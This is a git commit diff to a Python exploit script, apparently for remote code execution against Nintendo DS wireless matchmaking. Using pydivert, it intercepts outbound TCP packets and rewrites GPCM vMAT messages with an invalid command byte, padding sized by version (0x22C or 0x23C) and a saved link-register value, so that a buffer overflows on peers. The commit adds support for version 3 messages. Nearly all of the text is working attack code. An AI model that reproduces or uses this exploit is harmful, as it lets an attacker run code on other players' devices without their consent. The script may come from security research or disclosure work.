2c229c223915a79496c7e8454c9263eb626efc12
MikeIsAStar <99037623+MikeIsAStar@users.noreply.github.com>
2023-11-06 01:00:00 -0500

    Add support for GPCM3vMAT messages

--- ds_wireless_communication_remote_code_execution.py
+++ ds_wireless_communication_remote_code_execution.py
@@ -6,10 +6,13 @@ result of damages caused by the usage of this code.
 """
 
 __author__ = 'MikeIsAStar'
-__date__ = '03 Nov 2023'
+__date__ = '06 Nov 2023'
 
 import re
 import sys
+
+if sys.version_info < (3, 10):
+    sys.exit("This program requires Python 3.10 or above !")
 
 try:
     import pydivert
@@ -25,22 +28,36 @@ assert len(PADDING) > 0x00
 
 # Constants
 DWC_MATCH_COMMAND_INVALID = b'\xFE'
-PADDING_LENGTH = 0x23C
+DWC_MATCHING_VERSION_3_PADDING_LENGTH = 0x22C
+DWC_MATCHING_VERSION_11_PADDING_LENGTH = 0x23C
 FINAL_KEY = b'\\final\\'
 WINDIVERT_FILTER = 'outbound and tcp and tcp.PayloadLength > 0'
 
 
 def try_modify_payload(payload):
-    message_pattern = rb'\\msg\\GPCM[1-9][0-9]?vMAT'
+    message_pattern = rb'\\msg\\GPCM([1-9][0-9]?)vMAT'
     message = re.search(message_pattern, payload)
     if not message:
         return None
 
+    matching_version = int(message.group(1))
+    match matching_version:
+        case 3:
+            padding_length = DWC_MATCHING_VERSION_3_PADDING_LENGTH
+        case 11:
+            padding_length = DWC_MATCHING_VERSION_11_PADDING_LENGTH
+        case _:
+            print(f'Modifying GPCM{matching_version}vMAT messages is not yet supported !')
+            return None
+
     payload = payload[:message.end()]
     payload += DWC_MATCH_COMMAND_INVALID
-    payload += (PADDING * (PADDING_LENGTH // len(PADDING) + 1))[:PADDING_LENGTH]
+    payload += (PADDING * (padding_length // len(PADDING) + 1))[:padding_length]
     payload += LR_SAVE
     payload += FINAL_KEY
+
+    print('Modified a GPCM message !')
+
     return payload
 
 
@@ -50,7 +67,6 @@ def main():
             for packet in packet_buffer:
                 payload = try_modify_payload(packet.payload)
                 if payload is not None:
-                    print('Modified a GPCM message !')
                     packet.payload = payload
                 packet_buffer.send(packet)
     except KeyboardInterrupt:
